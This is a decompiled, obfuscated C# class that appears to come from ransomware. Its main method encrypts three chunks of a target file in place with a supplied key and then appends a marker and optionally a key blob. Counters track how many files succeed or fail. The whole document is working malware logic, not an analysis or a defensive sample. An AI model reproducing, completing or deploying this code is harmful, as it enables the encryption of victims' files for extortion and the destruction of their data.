using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ogUJEKRzCNQ;

namespace nVxbvhuaKzC;

internal sealed class IQGXzrSFQTv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int LspcUUitZpfmm(long long_0)
	{
		return (int)long_0;
	}

	public static bool lVXyHETerTvlQUP(string aaLliBXnjhZnqN, string VNdAcYNkij, string jxSBPXEBHhCPiZ, byte[] ZIVXZvXjksmJ = null, byte[] cMxwfkxTxuq = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(aaLliBXnjhZnqN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = LspcUUitZpfmm(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(VNdAcYNkij) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(VNdAcYNkij) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(VNdAcYNkij) * 1024 * 1024) / 10;
				}
				int oksbpkgzaXA = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = rVmmuUJFSiM(aaLliBXnjhZnqN, fileStream, oksbpkgzaXA, num * i);
					array = (FcnBvlzKWyQDwH.oVxIyLzScyQqp ? qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(jxSBPXEBHhCPiZ), cMxwfkxTxuq) : iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(jxSBPXEBHhCPiZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					ltAIJrYlFMQQ(aaLliBXnjhZnqN, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = ((!FcnBvlzKWyQDwH.YrjqOIvQHnLHl) ? (FcnBvlzKWyQDwH.WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107407271)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408283)) + Convert.ToString(VNdAcYNkij) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408283))) : Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107407252)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408283)) + Convert.ToString(VNdAcYNkij) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408283)))) : (FcnBvlzKWyQDwH.WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107407226)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408293)) + Convert.ToString(VNdAcYNkij) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408293))) : Encoding.ASCII.GetBytes(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107407252)) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408293)) + Convert.ToString(VNdAcYNkij) + FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107408293)))));
			if (!FcnBvlzKWyQDwH.YrjqOIvQHnLHl)
			{
				using FileStream fileStream2 = new FileStream(aaLliBXnjhZnqN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(aaLliBXnjhZnqN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(ZIVXZvXjksmJ, 0, ZIVXZvXjksmJ.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (FcnBvlzKWyQDwH.IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(FcnBvlzKWyQDwH.AJzDKHoaGNRf, getString_0(107386564) + aaLliBXnjhZnqN + getString_0(107407245) + ex.Message + getString_0(107396606));
				}
				catch (Exception)
				{
				}
			}
			FcnBvlzKWyQDwH.YQVkVIVGpFAMQ++;
			return false;
		}
		FcnBvlzKWyQDwH.emFRwwndTZvr++;
		return true;
	}

	public static byte[] rVmmuUJFSiM(string QSlFIhmEJFu, FileStream dJadUUlZlSgY, int oksbpkgzaXA, int VcxoPoDaVNgY = 0)
	{
		byte[] array = new byte[oksbpkgzaXA];
		dJadUUlZlSgY.Position = VcxoPoDaVNgY;
		dJadUUlZlSgY.Read(array, 0, oksbpkgzaXA);
		return array;
	}

	public static void ltAIJrYlFMQQ(string NSXRPWXirmYyoCB, FileStream rRABebqCOTS, byte[] OTLnckqdYNI, int yfflMayJTE = 0)
	{
		rRABebqCOTS.Position = yfflMayJTE;
		rRABebqCOTS.Write(OTLnckqdYNI, 0, OTLnckqdYNI.Length);
	}

	static IQGXzrSFQTv()
	{
		Strings.CreateGetStringDelegate(typeof(IQGXzrSFQTv));
	}
}
